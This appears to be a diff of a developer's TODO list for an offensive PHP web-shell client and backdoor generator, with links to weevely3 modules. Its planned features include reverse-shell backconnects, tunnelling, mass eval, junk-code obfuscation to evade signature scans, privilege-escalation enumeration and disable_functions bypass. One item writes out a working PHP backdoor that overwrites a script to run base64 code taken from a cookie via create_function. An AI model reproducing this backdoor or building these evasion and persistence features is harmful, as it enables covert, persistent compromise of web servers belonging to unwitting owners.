@@ -1,38 +1,42 @@
 ﻿BUGS
 * size bug on larger files via tooltip
 
-NEW ITEMS
-
 * ? - start shell code with shell start shell end tags with html comment - "maybe don't need? or make it a backdoor generation/cfg feature"
-* ? - global cfg for Backdoor generator features to save "per server" to change the signatures, request vars, encrpytion, match encryption options etc
 * ? - response encryption in the payload options?
-* 10 - SQL Browser
+* 10 - SQL Browser - https://github.com/epinna/weevely3/blob/master/modules/sql/_dump/mysqldump.tpl
 * 7 - reverse tcp connection feature with all the backconnects xD - https://github.com/epinna/weevely3/blob/master/modules/backdoor/reversetcp.py
 * 7 - tunnel feature, right click a client set them as the tunnel, all traffic will go through them first, have an icon to display who's the tunnel, unset tunnel, test communication etc
 * 6 - change read file to download file, make edit file with cancel button, uploader, finish editor, auto deploy upload features such as ysm, downloader
-* 6 - mass eval, and a way to track results in a clean UI
 * 6 - Make payloads and functionality for the Software->Apache .. Samba .. etc and more, Payload should attempt to read a bunch of files (possible locations of related files for selected software), concact result, display files names and results in a single rich textbox?
 * 4 - Make a way to spawn a listener type shell, and multiple ways to do a back connect shell ?
 * 4 - "Junk code / random code" feature to the backdoor generator, splits code up, places random meaningless operations in between needed operations to defeat - "sig/byte" scan's
 * 4 - password feature?
 * 4 - Implement posix get posix_getpwuid function for linux getpasswd bypass, use a prompt to get use input for loop size
 * 3 - linux info, "cmd" - mount, && cat /etc/fstab && ls -la /etc/cron && ls -aRl /etc/cron* (writeable/we will display color green/red/grey etc when showing), 
-* 3 - make disable error reporting a cfg/xml loaded var/ changable in the ("settings") to appernd error reporting onto every request, same for execution time?
 * 3 - CMD option to disable message boxes
 * 3 - Advanced options to edit code exectuin type to change from system to exec, etc (global)
 * 3 - bantam self / shell code editor, editing the bantam stored online - file_put_contents($_SERVER["SCRIPT_FILENAME"], '<?php if(isset($_COOKIE["sID"])) {$a=@create_function(null, @base64_decode($_COOKIE["sID"]));$a();}')
 * 2 - enum for the imagelist icons,  and enum for the returned data from file browser
 * 2 - add validity/testing checking to edit / add shell
 * 3 - Check site before add into clients, if its non existant or shell doesnt work, test with google.com etc
+* 3 - file browser tree view sorting, and show permissions
+* 3 - read file size limit check & mime check/show pictures in picture control
+* 3 - file upload / true downloader
+* 2 - internal port scanner!!
+* 2 - find writeable files and folders?- https://github.com/epinna/weevely3/blob/master/modules/audit/filesystem.py
+* 2 - audit php configuration - https://github.com/epinna/weevely3/blob/master/modules/audit/phpconf.py
+* 2 - upload linuxpriv enum and get output when poss
 * 1 - move browserview from a form to a Dynamic "Prompt", reconsider the name "Prompt"
 * 1 - filebrowser bug when click back from windows
-* 1 - allowable charector check on var name of backdoor generator 
+* 1 - allowable charector check on var name of backdoor generator
+* 1 - disable functions bypass 
+* 1 - touch feature
+* 1 - passwd bypass
+* 1 - find suid/gid files !
 * 1 - fake response as b64 image
 * 1 - make row and col seperator random
 * 1 - encryption - should have option to send as stager or already be uploaded
 * 1 - proxy support credentials
-* 1 - change encryption keys on every request option
-* 1 - randomize proxy automatically in global options panel
 * 1 - if i do eval and type echo '123' it apends to the resposne and breaks the decryption
 * 1 - when mass eval, shouldn't be able to click show response, or make feature to track all responses and show them
 * 1 - payload b64 letter swapping XD
@@ -41,5 +45,9 @@ NEW ITEMS
 * 1 - hex encoded functions  on the php side
 * 1 - max payload size
 * 10 - sort and parse filebrowser!
+
+* 1 - global cfg option to enable disable error suppression via @ to see more debug data
+* 3 - make disable error reporting a cfg/xml loaded var/ changable in the ("settings") to appernd error reporting onto every request, same for execution time?
+* ? - global cfg for Backdoor generator features to save "per server" to change the signatures, request vars, encrpytion, match encryption options etc
 
   https://github.com/epinna/weevely3/blob/master/modules/audit/_linuxprivchecker/linuxprivchecker.py - helpful system info
